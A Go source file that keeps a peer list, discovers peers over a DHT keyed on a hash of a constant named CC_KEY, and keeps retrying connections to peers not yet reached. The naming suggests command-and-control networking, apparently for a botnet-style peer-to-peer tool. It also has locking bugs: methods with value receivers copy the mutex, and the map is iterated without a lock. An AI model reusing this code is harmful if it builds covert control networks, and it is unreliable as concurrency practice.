package main

import (
	"fmt"
	"net"
	"sync"
	"time"
)

type Peer struct {
	HostName    string
	ApparentIP  string
	Conn        net.Conn
	ID          int
	Alive       bool
	LastSeen    int64
	MessageChan chan []byte
}

type PList struct {
	Peers     map[int]*Peer
	PeerCount int
	m         sync.Mutex
}

func (p *PList) Add(n Peer) {
	p.m.Lock()
	p.PeerCount++
	n.ID = p.PeerCount
	p.Peers[p.PeerCount] = &n
	p.m.Unlock()
}

func (p PList) ContainsIP(host string) bool {
	p.m.Lock()
	defer p.m.Unlock()
	for _, v := range p.Peers {
		if v.ApparentIP == host {
			debuglogger.Printf("DEBUG %s LOOKS ALOT LIKE %s", v.ApparentIP, host)
			return true
		}
	}
	return false
}

func (p PList) RemoveByStruct(n Peer) {
	p.m.Lock()
	//p.Peers[n.ID].Alive = false
	if p.Peers[n.ID].Conn != nil {
		p.Peers[n.ID].Conn.Close()
	}
	p.m.Unlock()
}

var GlobalPeerList PList

func StartLookingForPeers() {
	GlobalPeerList = PList{}
	GlobalPeerList.Peers = make(map[int]*Peer)
	GlobalPeerList.PeerCount = 0

	hash := HashValue([]byte(CC_KEY))
	inboundchan := StartDHT(fmt.Sprintf("%x", hash[:20]))
	for host := range inboundchan {
		if !GlobalPeerList.ContainsIP(host) {
			NewPeer := Peer{}
			NewPeer.Alive = false
			NewPeer.ApparentIP = host
			GlobalPeerList.Add(NewPeer)
			debuglogger.Printf("DEBUG: Added new peer to the peer list, Host is %s", host)
		}
	}
}

func AutoSavePeerList() {

}

func ScountOutNewPeers() {
	for {
		for k, v := range GlobalPeerList.Peers {
			if !v.Alive {
				debuglogger.Printf("DEBUG: Looking in the Peer list, Going to try and *connect* to from %s %d", v.ApparentIP, k)
				err := ConnectToPeer(v)
				if err == nil {
					GlobalPeerList.m.Lock()
					GlobalPeerList.Peers[k].Alive = true
					GlobalPeerList.m.Unlock()
				}
			}
		}
		time.Sleep(time.Second * 5)
	}
}
